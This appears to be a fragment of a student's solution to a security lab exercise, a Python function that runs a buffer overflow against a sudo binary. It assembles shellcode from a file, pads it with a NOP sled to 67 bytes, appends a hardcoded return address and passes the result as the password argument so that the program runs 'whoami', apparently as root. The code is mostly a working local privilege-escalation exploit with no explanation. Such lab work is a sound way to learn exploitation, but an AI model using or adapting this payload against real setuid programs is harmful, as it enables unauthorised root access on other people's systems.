...
def run_shell(path_to_sudo: str):
    ...
    """
    # Your code goes here.
    shellcode=bytearray(assemble.assemble_file("./shellcode.asm"))
    nop=b'\x90'*(67-len(shellcode))
    ra=b'\x00\x6d\xff\xbf'
    password=shellcode+nop+ra
    os.execl(path_to_sudo,path_to_sudo,bytes(password),'whoami')
